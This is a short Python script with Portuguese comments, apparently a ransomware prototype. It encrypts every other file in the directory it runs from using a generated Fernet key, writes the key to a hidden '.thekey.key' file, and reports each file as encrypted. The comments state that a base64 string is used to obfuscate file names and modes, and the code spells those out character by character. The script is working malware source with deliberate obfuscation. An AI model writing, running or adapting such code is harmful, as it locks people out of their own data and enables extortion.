#! /usr/bin/env python3

#Esta ferramenta serve para criptografar/decriptografar os ficheiros existentes no diretório, onde o ficheiro deste script se encontra!!
#Autor: TuciraTeam
#Ano: 2022

# BIBLIOTECAS
import sys
import os
import base64
from cryptography.fernet import Fernet


# ACÇÃO PARA CODIFICAR EM BASE64 O VALOR DA STRING s01 QUE VAI SERVIR PARA OFUSCAR ALGUMAS PARTES DESTE SCRIPT
s01 = "IGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6Ll8oKTAxMjM0NTY3ODkK" 
decoded = base64.b64decode(s01.encode('ascii'))
a=decoded.decode('ascii')

# ACÇÃO QUE VAI PROCURAR NO DIRETORIO CORRENTE (ONDE ESTE SCRIPT ESTÁ GUARDADO) OS FICHEIROS QUE QUEREMOS CRIPTOGRAFAR E ARMAZENÁ-LOS NUMA VARIAVEL

s05 = [] 

for file in os.listdir():  
    if file == a[3]+a[18]+a[9]+a[16]+a[20]+a[6]+a[9]+a[12]+a[5]+a[27]+a[16]+a[25] or file == a[27]+a[20]+a[8]+a[5]+a[11]+a[5]+a[25]+a[27]+a[11]+a[5]+a[25] or file == a[4]+a[28]+a[3]+a[18]+a[9]+a[16]+a[20]+a[6]+a[9]+a[12]+a[5]+a[27]+a[16]+a[25]: 
        continue 
    if os.path.isfile(file): 
       s05.append(file) 

# ACÇÃO QUE VAI GERAR A CHAVE CRIPTOGRÁFICA
key = Fernet.generate_key() 

# ACÇÃO QUE VAI GUARDAR A CHAVE CRIPTOGRAFICA NUM FICHEIRO
with open(a[27]+a[20]+a[8]+a[5]+a[11]+a[5]+a[25]+a[27]+a[11]+a[5]+a[25], a[23]+a[2]) as thekey: 
        thekey.write(key) 

# ACÇÃO QUE VAI CRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05 COM A CHAVE CRIPTOGRAFICA GUARDADA NUM FICHEIRO
for file in s05: 
        print('\033[31m'+"Ficheiro:", file,"------> Encriptado"+'\033[0;0m') 
        with open(file, a[18]+a[2]) as thefile: 
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)   
        with open(file, a[23]+a[2]) as thefile:
                thefile.write(contents_encrypted) 
	              
print("\nFicheiros no Diretório '", os.getcwd(),"' foram Encriptados!")
